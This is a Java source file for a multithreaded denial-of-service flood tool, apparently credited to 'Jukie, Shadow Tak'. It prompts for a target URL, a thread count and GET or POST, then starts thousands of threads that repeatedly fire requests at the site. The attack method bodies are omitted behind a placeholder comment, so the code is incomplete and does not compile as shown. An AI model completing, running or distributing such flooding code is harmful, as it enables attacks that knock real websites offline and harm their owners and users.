import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {

    private final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                    // Thêm các loại tấn công mới tại đây
                    // case 5:
                    //    yourNewAttack(Dos.url);
                    //    break;
                    // case 6:
                    //    yourAnotherNewAttack(Dos.url);
                    //    break;
                    // ...

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ... (giữ nguyên các phương thức checkConnection, postAttack, getAttack, sslPostAttack, sslGetAttack)

    public static void main(String[] args) throws Exception {
        String url = "";
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("• URL: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Starting Attack to url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Checking connection to Site");
        if (SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("Setting DDoS By: Jukie, Shadow Tak");

        System.out.print("• THREAD (999999999): ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 2000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("• METHOD (GET/POST): ");
        String option = in.nextLine();
        int ioption = 1;
        if (option.equalsIgnoreCase("get")) {
            if (SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);

        System.out.println("Starting Attack");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        System.out.println("Main Thread ended");
    }
}